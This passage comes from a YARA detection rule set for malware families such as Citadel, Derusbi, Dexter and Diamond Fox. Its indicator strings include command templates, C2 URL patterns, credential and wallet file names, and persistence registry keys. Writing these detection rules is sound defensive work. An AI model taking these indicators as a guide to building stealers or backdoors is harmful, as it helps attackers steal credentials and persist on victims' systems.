\" fullword ascii\n        $s2 = \"%s\\\\cmd.exe /c %s >> \\\"%s\\\"\" fullword ascii\n        $s3 = \"shutdown.exe -r -t 0\" fullword ascii\n        $s4 = \"dir \\\"%SystemDrive%\\\\\\\" /s /a\" fullword ascii\n        $s5 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;\" fullword ascii\n        $s6 = \"http_s.exe\" fullword ascii\n        $s7 = \"User Agent\\\\Post Platform\\\\\" fullword ascii\n        $s8 = \"desktop.tmp\" fullword ascii\n        $s9 = \"\\\\support.icw\" fullword ascii\n        $s10 = \"agc.tmp\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of ($x*)) or 3 of them\n}\n\nrule citadel13xy\n{\n    meta:\n        description = \"Citadel banking trojan\"\n        classifications = \"Spyware\"\n        threat_names = \"Citadel\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jean-Philippe Teissier / @Jipe_\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"citadel13xy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"Coded by BRIAN KREBS for personnal use only. I love my job & wife.\"\n        $b = \"http://%02x%02x%02x%02x%02x%02x%02x%02x.com/%02x%02x%02x%02x/%02x%02x%02x%02x%02x.php\"\n        $c = \"%BOTID%\"\n        $d = \"%BOTNET%\"\n        $e = \"cit_video.module\"\n        $f = \"bc_remove\"\n        $g = \"bc_add\"\n        $ggurl = \"http://www.google.com/webhp\"\n\n    condition:\n        3 of them\n}\n\nrule Citadel_Malware\n{\n    meta:\n        description = \"Citadel banking trojan\"\n        classifications = \"Spyware\"\n        threat_names = \"Citadel\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"xylitol@temari.fr\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Citadel_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Coded by BRIAN KREBS for personal use only. I love my job & wife\" wide ascii\n        $s2 = \"nss3.dll\" wide ascii\n        $h1 = {8B C7 EB F5 55 8B EC}\n        $h2 = {55 8B EC 83 EC 0C 8A 82 00 01 00 00}\n        $h3 = {3D D0 FF 1F 03 77 ?? 83 7D}\n        $h4 = {83 F9 66 74 ?? 83 F9 6E 74 ?? 83 F9 76 74 ?? 83 F9 7A}\n\n    condition:\n        all of ($s*) and 2 of ($h*)\n}\n\nrule CloudDuke_Malware\n{\n    meta:\n        description = \"CloudDuke malware\"\n        ref = \"https://www.f-secure.com/weblog/archives/00002822.html\"\n        classifications = \"Trojan, Downloader\"\n        threat_names = \"CloudDuke\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"CloudDuke_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ProcDataWrap\" fullword ascii\n        $s2 = \"imagehlp.dll\" fullword ascii\n        $s3 = \"dnlibsh\" fullword ascii\n        $s4 = \"%ws_out%ws\" fullword wide\n        $s5 = \"Akernel32.dll\" fullword wide\n        $op0 = { 0f b6 80 68 0e 41 00 0b c8 c1 e1 08 0f b6 c2 8b }\n        $op1 = { 8b ce e8 f8 01 00 00 85 c0 74 41 83 7d f8 00 0f }\n        $op2 = { e8 2f a2 ff ff 83 20 00 83 c8 ff 5f 5e 5d c3 55 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 720KB and 4 of ($s*) and 1 of ($op*)\n}\n\nrule SFXRAR_Acrotray\n{\n    meta:\n        description = \"CloudDuke malware\"\n        ref = \"https://www.f-secure.com/weblog/archives/00002822.html\"\n        classifications = \"Trojan, Downloader\"\n        threat_names = \"CloudDuke\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SFXRAR_Acrotray\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"winrarsfxmappingfile.tmp\" fullword wide\n        $s2 = \"GETPASSWORD1\" fullword wide\n        $s3 = \"acrotray.exe\" fullword ascii\n        $s4 = \"CryptUnprotectMemory failed\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2449KB and all of them\n}\n\nrule CMStar_Malware_Sep17\n{\n    meta:\n        description = \"CMStar trojan\"\n        ref = \"https://goo.gl/pTffPA\"\n        classifications = \"Trojan\"\n        threat_names = \"CMStar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CMStar_Malware_Sep17\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"UpdateService.tmp\" fullword ascii\n        $s2 = \"StateNum:%d,FileSize:%d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (pe.imphash() == \"22021985de78a48ea8fb82a2ff9eb693\" or pe.exports(\"WinCred\") or all of them)\n}\n\nrule ce_enfal_cmstar_debug_msg\n{\n    meta:\n        description = \"CMStar trojan static debug strings\"\n        ref = \"http://goo.gl/JucrP9\"\n        classifications = \"Trojan\"\n        threat_names = \"CMStar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"rfalcone\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ce_enfal_cmstar_debug_msg\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $d1 = \"EEE\\x0d\\x0a\" fullword\n        $d2 = \"TKE\\x0d\\x0a\" fullword\n        $d3 = \"VPE\\x0d\\x0a\" fullword\n        $d4 = \"VPS\\x0d\\x0a\" fullword\n        $d5 = \"WFSE\\x0d\\x0a\" fullword\n        $d6 = \"WFSS\\x0d\\x0a\" fullword\n        $d7 = \"CM**\\x0d\\x0a\" fullword\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($d*)\n}\n\nrule CorkowDLL\n{\n    meta:\n        description = \"Corkow banking trojan DLL files\"\n        ref = \"https://www.group-ib.ru/brochures/Group-IB-Corkow-Report-EN.pdf\"\n        classifications = \"Spyware\"\n        threat_names = \"Corkow\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Group IB\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CorkowDLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $binary1 = { 60 [0-8] 9C [0-8] BB ?? ?? ?? ?? [0-8] 81 EB ?? ?? ?? ?? [0-8] E8 ?? 00 00 00 [0-8] 58 [0-8] 2B C3 }\n        $binary2 = { (FF 75 ?? | 53) FF 75 10 FF 75 0C FF 75 08 E8 ?? ?? ?? ?? [3-9] C9 C2 0C 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($binary*) and (pe.exports(\"Control_RunDLL\") or pe.exports(\"ServiceMain\") or pe.exports(\"DllGetClassObject\")) or (pe.exports(\"ServiceMain\") and pe.exports(\"Control_RunDLL\")))\n}\n\nrule Cythosia\n{\n    meta:\n        description = \"Cythosia bot\"\n        classifications = \"Bot\"\n        threat_names = \"Cythosia\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"Cythosia\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $str1 = \"HarvesterSocksBot.Properties.Resources\" wide\n\n    condition:\n        all of them\n}\n\nrule darksky_http\n{\n    meta:\n        description = \"DarkSky HTTP DDoS bot\"\n        ref = \"https://github.com/ims0rry/DarkSky-botnet\"\n        classifications = \"Bot\"\n        threat_names = \"DarkSky\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"tjadanel @reonfleek\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        original_name = \"darksky_http\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $comm0 = \"\\\", \\\"s5\\\":\\\"\"\n        $comm1 = \"\\\", \\\"s4\\\":\\\"\"\n        $comm2 = \"\\\", \\\"http\\\":\\\"\"\n        $comm3 = \"\\\", \\\"ram\\\":\\\"\"\n        $comm4 = \"\\\", \\\"s5\\\":\\\"0\\\", \\\"s4\\\":\\\"0\\\", \\\"http\\\":\\\"0\\\"}\"\n        $comm6 = \"udp:\"\n        $comm7 = \"speed:\"\n        $comm8 = \"threads:\"\n        $comm9 = \"method.http:\"\n        $encoded0 = \"bndvbmtuVQ==\"\n        $encoded1 = \"c3NlY29yUDQ2d29Xc0k=\"\n        $encoded2 = \"cmVWcmVTIG8wbzI=\"\n        $encoded3 = \"N24xVw==\"\n        $encoded4 = \"MG9vMg==\"\n        $cleartext0 = \"THTTPSend\"\n        $cleartext1 = \"httpsend\"\n        $cleartext2 = \"2o0o SerVer\"\n        $cleartext3 = \"W1nX\"\n        $cleartext4 = \"2oo0\"\n        $cleartext5 = \"V1sta\"\n        $cleartext6 = \"W1n7\"\n        $useragents0 = \"2zAz\"\n        $useragents1 = \"Mozilla/4.0 (compatible; Synapse)\"\n\n    condition:\n        (uint16(0) == 0x5A4D) and (4 of ($comm*)) and ((3 of ($encode*) or (3 of ($cleartext*)))) and (any of ($useragents*))\n}\n\nrule Datper_Backdoor\n{\n    meta:\n        description = \"Datper malware\"\n        ref = \"http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"Datper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Datper_Backdoor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"RtlGetCo\" fullword ascii\n        $s2 = \"hutils\" fullword ascii\n        $s3 = \"kza2FWU,f;\\\"3U&zpa3U(W`J\" fullword ascii\n        $c1 = \"dkkwldngn\" fullword ascii\n        $c2 = \"ndkkwqgcm\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and (pe.imphash() == \"58db98e2334746d349d607e4d73bc5ea\" or pe.imphash() == \"8fbed921458af485ce84fb7d9b13899e\" or (2 of ($s*) and 1 of ($c*)) or ($s3 and $c1)))\n}\n\nrule Derkziel\n{\n    meta:\n        description = \"Derkziel info stealer\"\n        ref = \"https://bhf.su/threads/137898/\"\n        classifications = \"Spyware\"\n        threat_names = \"Derkziel\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"The Malware Hunter\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Derkziel\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $drz = \"{!}DRZ{!}\"\n        $ua = \"User-Agent: Uploador\"\n        $steam = \"SteamAppData.vdf\"\n        $login = \"loginusers.vdf\"\n        $config = \"config.vdf\"\n\n    condition:\n        all of them\n}\n\nrule apt_nix_elf_derusbi\n{\n    meta:\n        description = \"Derusbi backdoor\"\n        ref = \"https://github.com/fideliscyber/indicators/tree/master/FTA-1021\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fidelis Cybersecurity\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"apt_nix_elf_derusbi\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"LxMain\"\n        $s2 = \"execve\"\n        $s3 = \"kill\"\n        $s4 = \"cp -a %s %s\"\n        $s5 = \"%s &\"\n        $s6 = \"dbus-daemon\"\n        $s7 = \"--noprofile\"\n        $s8 = \"--norc\"\n        $s9 = \"TERM=vt100\"\n        $s10 = \"/proc/%u/cmdline\"\n        $s11 = \"loadso\"\n        $s12 = \"/proc/self/exe\"\n        $s13 = \"Proxy-Connection: Keep-Alive\"\n        $s14 = \"Connection: Keep-Alive\"\n        $s15 = \"CONNECT %s\"\n        $s16 = \"HOST: %s:%d\"\n        $s17 = \"User-Agent: Mozilla/4.0\"\n        $s18 = \"Proxy-Authorization: Basic %s\"\n        $s19 = \"Server: Apache\"\n        $s20 = \"Proxy-Authenticate\"\n        $s21 = \"gettimeofday\"\n        $s22 = \"pthread_create\"\n        $s23 = \"pthread_join\"\n        $s24 = \"pthread_mutex_init\"\n        $s25 = \"pthread_mutex_destroy\"\n        $s26 = \"pthread_mutex_lock\"\n        $s27 = \"getsockopt\"\n        $s28 = \"socket\"\n        $s29 = \"setsockopt\"\n        $s30 = \"select\"\n        $s31 = \"bind\"\n        $s32 = \"shutdown\"\n        $s33 = \"listen\"\n        $s34 = \"opendir\"\n        $s35 = \"readdir\"\n        $s36 = \"closedir\"\n        $s37 = \"rename\"\n\n    condition:\n        uint32(0) == 0x4464c457f and all of them\n}\n\nrule apt_nix_elf_derusbi_kernelModule\n{\n    meta:\n        description = \"Derusbi backdoor kernel module\"\n        ref = \"https://github.com/fideliscyber/indicators/tree/master/FTA-1021\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fidelis Cybersecurity\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"apt_nix_elf_derusbi_kernelModule\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"__this_module\"\n        $s2 = \"init_module\"\n        $s3 = \"unhide_pid\"\n        $s4 = \"is_hidden_pid\"\n        $s5 = \"clear_hidden_pid\"\n        $s6 = \"hide_pid\"\n        $s7 = \"license\"\n        $s8 = \"description\"\n        $s9 = \"srcversion=\"\n        $s10 = \"depends=\"\n        $s12 = \"vermagic=\"\n        $s13 = \"current_task\"\n        $s14 = \"sock_release\"\n        $s15 = \"module_layout\"\n        $s16 = \"init_uts_ns\"\n        $s17 = \"init_net\"\n        $s18 = \"init_task\"\n        $s19 = \"filp_open\"\n        $s20 = \"__netlink_kernel_create\"\n        $s21 = \"kfree_skb\"\n\n    condition:\n        uint32(0) == 0x4464c457f and all of them\n}\n\nrule apt_nix_elf_Derusbi_Linux_SharedMemCreation\n{\n    meta:\n        description = \"Derusbi backdoor shared memory creation\"\n        ref = \"https://github.com/fideliscyber/indicators/tree/master/FTA-1021\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fidelis Cybersecurity\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"apt_nix_elf_Derusbi_Linux_SharedMemCreation\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $byte1 = { B6 03 00 00 ?? 40 00 00 00 ?? 0D 5F 01 82 }\n\n    condition:\n        uint32(0) == 0x464C457F and any of them\n}\n\nrule apt_nix_elf_Derusbi_Linux_Strings\n{\n    meta:\n        description = \"Derusbi backdoor strings\"\n        ref = \"https://github.com/fideliscyber/indicators/tree/master/FTA-1021\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fidelis Cybersecurity\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"apt_nix_elf_Derusbi_Linux_Strings\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"loadso\" wide ascii fullword\n        $a2 = \"\\nuname -a\\n\\n\" wide ascii\n        $a3 = \"/dev/shm/.x11.id\" wide ascii\n        $a4 = \"LxMain64\" wide ascii nocase\n        $a5 = \"# \\\\u@\\\\h:\\\\w \\\\$ \" wide ascii\n        $b1 = \"0123456789abcdefghijklmnopqrstuvwxyz\" wide\n        $b2 = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\" wide\n        $b3 = \"ret %d\" wide fullword\n        $b4 = \"uname -a\\n\\n\" wide ascii\n        $b5 = \"/proc/%u/cmdline\" wide ascii\n        $b6 = \"/proc/self/exe\" wide ascii\n        $b7 = \"cp -a %s %s\" wide ascii\n        $c1 = \"/dev/pts/4\" wide ascii fullword\n        $c2 = \"/tmp/1408.log\" wide ascii fullword\n\n    condition:\n        uint32(0) == 0x464C457F and ((1 of ($a*) and 4 of ($b*)) or (1 of ($a*) and 1 of ($c*)) or 2 of ($a*) or all of ($b*))\n}\n\nrule derusbi_linux\n{\n    meta:\n        description = \"Derusbi backdoor server\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Airbus Defence and Space Cybersecurity CSIRT - Fabien Perigaud\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"derusbi_linux\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $PS1 = \"PS1=RK# \\\\u@\\\\h:\\\\w \\\\$\"\n        $cmd = \"unset LS_OPTIONS;uname -a\"\n        $pname = \"[diskio]\"\n        $rkfile = \"/tmp/.secure\"\n        $ELF = \"\\x7fELF\"\n\n    condition:\n        $ELF at 0 and $PS1 and $cmd and $pname and $rkfile\n}\n\nrule Derusbi_Kernel_Driver_WD_UDFS\n{\n    meta:\n        description = \"Derusbi backdoor kernel driver\"\n        ref = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Derusbi_Kernel_Driver_WD_UDFS\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n        $x2 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n        $x3 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n        $x4 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n        $x5 = \"$$$--Hello\" fullword ascii\n        $x6 = \"Wrod--$$$\" fullword ascii\n        $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n        $s2 = \"Update.dll\" fullword ascii\n        $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n        $s4 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n        $s5 = \"HOST: %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and (2 of ($x*) or all of ($s*))\n}\n\nrule Derusbi_Code_Signing_Cert\n{\n    meta:\n        description = \"Code-signing certificate used for the Derusbi backdoor\"\n        ref = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Derusbi_Code_Signing_Cert\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Fuqing Dawu Technology Co.,Ltd.0\" fullword ascii\n        $s2 = \"XL Games Co.,Ltd.0\" fullword ascii\n        $s3 = \"Wemade Entertainment co.,Ltd0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and 1 of them\n}\n\nrule Derusbi_XOR_4byte_Key\n{\n    meta:\n        description = \"Derusbi backdoor XOR key\"\n        ref = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"XOR_4byte_Key\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and all of them\n}\n\nrule Derusbi_Backdoor_Mar17_1\n{\n    meta:\n        description = \"Derusbi backdoor\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Derusbi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Derusbi_Backdoor_Mar17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n        $x2 = \"c%WINDIR%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\pchsvc.dll\" fullword wide\n        $x3 = \"%Systemroot%\\\\Help\\\\perfc009.dat\" fullword wide\n        $x4 = \"rundll32.exe \\\"%s\\\", R32 %s\" fullword wide\n        $x5 = \"OfficeUt32.dll\" fullword ascii\n        $x6 = \"\\\\\\\\.\\\\pipe\\\\usb%so\" fullword wide\n        $x7 = \"\\\\\\\\.\\\\pipe\\\\usb%si\" fullword wide\n        $x8 = \"\\\\tmp1.dat\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 1 of them)\n}\n\nrule dexter_strings\n{\n    meta:\n        description = \"Dexter POS grabber\"\n        classifications = \"Spyware, POS\"\n        threat_names = \"Dexter\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"dexter_strings\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"UpdateMutex:\"\n        $s2 = \"response=\"\n        $s3 = \"page=\"\n        $s4 = \"scanin:\"\n\n    condition:\n        all of them\n}\n\nrule Dexter_Malware\n{\n    meta:\n        description = \"Dexter POS grabber\"\n        classifications = \"Spyware, POS\"\n        threat_names = \"Dexter\"\n        ref = \"http://goo.gl/oBvy8b\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Dexter_Malware\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Java Security Plugin\" fullword wide\n        $s1 = \"%s\\\\%s\\\\%s.exe\" fullword wide\n        $s2 = \"Sun Java Security Plugin\" fullword wide\n        $s3 = \"\\\\Internet Explorer\\\\iexplore.exe\" fullword wide\n\n    condition:\n        all of them\n}\n\nrule pos_malwre_dexter_stardust\n{\n    meta:\n        description = \"Dexter POS grabber\"\n        classifications = \"Spyware, POS\"\n        threat_names = \"Dexter\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@patrickrolsen\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"pos_malwre_dexter_stardust\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ceh_3\\\\.\\\\ceh_4\\\\..\\\\ceh_6\"\n        $s2 = \"Yatoed3fe3rex23030am39497403\"\n        $s3 = \"Poo7lo276670173quai16568unto1828Oleo9eds96006nosysump7hove19\"\n        $s4 = \"CommonFile.exe\"\n\n    condition:\n        uint16(0) == 0x5A4D and all of ($s*)\n}\n\nrule diamond_fox\n{\n    meta:\n        description = \"Diamond Fox spyware\"\n        classifications = \"Spyware\"\n        threat_names = \"Diamond Fox\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"diamond_fox\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $s1 = \"UPDATE_B\"\n        $s2 = \"UNISTALL_B\"\n        $s3 = \"S_PROTECT\"\n        $s4 = \"P_WALLET\"\n        $s5 = \"GR_COMMAND\"\n        $s6 = \"FTPUPLOAD\"\n\n    condition:\n        all of them\n}\n\nrule diamond_fox_\n{\n    meta:\n        description = \"Diamond Fox spyware\"\n        ref = \"https://blog.malwarebytes.com/threat-analysis/2017/03/diamond-fox-p1/, https://blog.checkpoint.com/2017/05/10/diamondfox-modular-malware-one-stop-shop/\"\n        classifications = \"Spyware\"\n        threat_names = \"Diamond Fox\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"tjadanel @reonfleek\"\n        source = \"https://github.com/tjnel/yara_repo\"\n        original_name = \"diamond_fox\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $cfg0 = \"L!NK\" nocase\n        $persist0 = \"Policies\\\\System\\\\EnableLUA\" wide\n        $persist1 = \"HKLM\\\\Software\\\\Microsoft\\\\Security Center\\\\UACDisableNotify\" wide\n        $persist2 = \"\\\\Windows\\\\CurrentVersion\\\\\" wide\n        $persist3 = \"\\\\Windows NT\\\\CurrentVersion\\\\\" wide\n        $persist4 = \"Policies\\\\Explorer\\\\Run\\\\\" wide\n        $persist5 = \"\\\\CurrentVersion\\\\RunOnce\\\\\" wide\n        $diamond0 = \"70144646\" wide\n        $diamond1 = \"coin\" wide\n        $diamond2 = \"BitcoinDark\" wide\n        $diamond3 = \"Asic\" wide\n        $diamond4 = \"Prime\" wide\n        $diamond5 = \"Electrum\" wide\n        $diamond6 = \"Armory\" wide\n        $diamond7 = \".vbs\" wide\n        $comm0 = \"&x=\" wide\n        $comm1 = \"ping -n 4 127.0.0.1 > nul\" wide\n        $comm2 = \"?p=\" wide\n        $comm3 = \"&y=\" wide\n        $comm4 = \"/gate.php\" wide\n        $comm5 = \"select * from \" wide\n\n    condition:\n        (uint16(0) == 0x5A4D) and (all of ($cfg*)) and (all of ($persist*)) and (all of ($comm*)) and (all of ($diamond*))\n}\n\nrule DirtJumper_drive\n{\n    meta:\n        description = \"Dirt Jumper bot\"\n        classifications = \"Bot\"\n        threat_names = \"Dirt Jumper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DirtJumper_drive\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" 